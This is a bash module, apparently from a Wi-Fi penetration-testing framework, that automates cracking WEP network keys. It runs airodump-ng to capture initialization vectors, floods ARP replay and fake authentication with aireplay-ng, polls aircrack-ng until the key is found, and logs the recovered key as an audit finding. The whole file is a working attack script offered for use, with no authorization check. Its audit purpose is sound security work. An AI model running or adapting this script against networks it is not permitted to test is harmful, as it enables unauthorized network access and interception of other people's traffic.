#!/usr/bin/env bash
# MODULE_META
# NAME="WEP Network Cracking [Past Attacks]"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="airodump-ng,aireplay-ng,aircrack-ng"
# DESC="Detect and crack legacy WEP networks via ARP replay and fragmentation"
# REQS="monitor_iface,target_bssid,target_channel"
# PCAP="yes"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/d2_wep_cracking.sh
#  D2: WEP Network Cracking (Golden Wrapper)
#
#  METHODOLOGY:
#  1. Capture initialization vectors (IVs) from the target WEP network.
#  2. Use ARP replay to rapidly generate new IVs.
#  3. Smart Exit: Periodically attempt to recover the key while capturing.
#     Exit successfully the moment the key is found.
#===============================================================================

set -euo pipefail

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
BSSID="${GUEST_BSSID:-}"
CHANNEL="${GUEST_CHANNEL:-}"
SCAN_TIME="${SCAN_TIME:-300}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="D2"
OUTPUT_BASE="${EVIDENCE_DIR}/${TC_ID}_capture"

if [[ -z "$INTERFACE" || -z "$BSSID" ]]; then
    echo "[!] MONITOR_INTERFACE or GUEST_BSSID not set."
    exit 1
fi

echo "[*] Starting WEP cracking attempt on ${BSSID} (Channel: ${CHANNEL:-auto})..."

# Ensure channel is set correctly
if [[ -n "$CHANNEL" && "$CHANNEL" != "0" ]]; then
    iw dev "$INTERFACE" set channel "$CHANNEL" 2>/dev/null || true
fi

# 1. Start airodump-ng to capture IVs
airodump-ng --bssid "$BSSID" \
    --channel "${CHANNEL:-0}" \
    --write "$OUTPUT_BASE" \
    --output-format pcap,csv \
    "$INTERFACE" > /dev/null 2>&1 &
AIRODUMP_PID=$!

# 2. Start ARP Replay in background to flood IVs
echo "[*] Launching ARP replay attack to generate IVs..."
aireplay-ng --arpreplay -b "$BSSID" "$INTERFACE" > /dev/null 2>&1 &
AIREPLAY_PID=$!

# Cleanup function
cleanup() {
    [[ -n "${AIRODUMP_PID:-}" ]] && kill "$AIRODUMP_PID" 2>/dev/null || true
    [[ -n "${AIREPLAY_PID:-}" ]] && kill "$AIREPLAY_PID" 2>/dev/null || true
}
trap cleanup EXIT

# 3. Smart Exit Polling Loop
CAP_FILE="${OUTPUT_BASE}-01.cap"
KEY_FILE="${EVIDENCE_DIR}/${TC_ID}_key.txt"
ELAPSED=0
SUCCESS=0

echo "[*] Monitoring IV collection. Will attempt to crack every 30 seconds..."

while [[ $ELAPSED -lt $SCAN_TIME ]]; do
    sleep 30
    ((ELAPSED+=30))

    if [[ -f "$CAP_FILE" ]]; then
        # Attempt to crack
        if aircrack-ng -b "$BSSID" "$CAP_FILE" > "$KEY_FILE" 2>&1; then
            if grep -q "KEY FOUND" "$KEY_FILE"; then
                echo "[!] SUCCESS: WEP KEY RECOVERED IN ${ELAPSED}s!"
                SUCCESS=1
                break
            fi
        fi
    fi
    
    # Send occasional fake authentication to keep the connection "warm"
    aireplay-ng --fakeauth 10 -a "$BSSID" "$INTERFACE" > /dev/null 2>&1 || true
done

# 4. Reporting
if [[ $SUCCESS -eq 1 ]]; then
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "WEP Key Recovered" \
        --severity CRITICAL \
        --desc "The cleartext WEP key was recovered for BSSID ${BSSID} after ${ELAPSED} seconds of IV collection." \
        --evidence "$KEY_FILE" \
        --rationale "WEP is cryptographically broken. Recovering the key allows full, unauthorized access to all transit traffic and the internal network."
else
    echo "[+] Mission complete. No WEP keys recovered."
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[$TC_ID] Audit Complete" \
        --severity INFO \
        --desc "Attempted to recover WEP keys for ${BSSID}, but insufficient IVs were collected within the scan window." \
        --evidence "$CAP_FILE" \
        --rationale "WEP cracking depends on high traffic volume to generate IVs. If the network is idle, recovery may take significant time or fail."
fi

exit 0
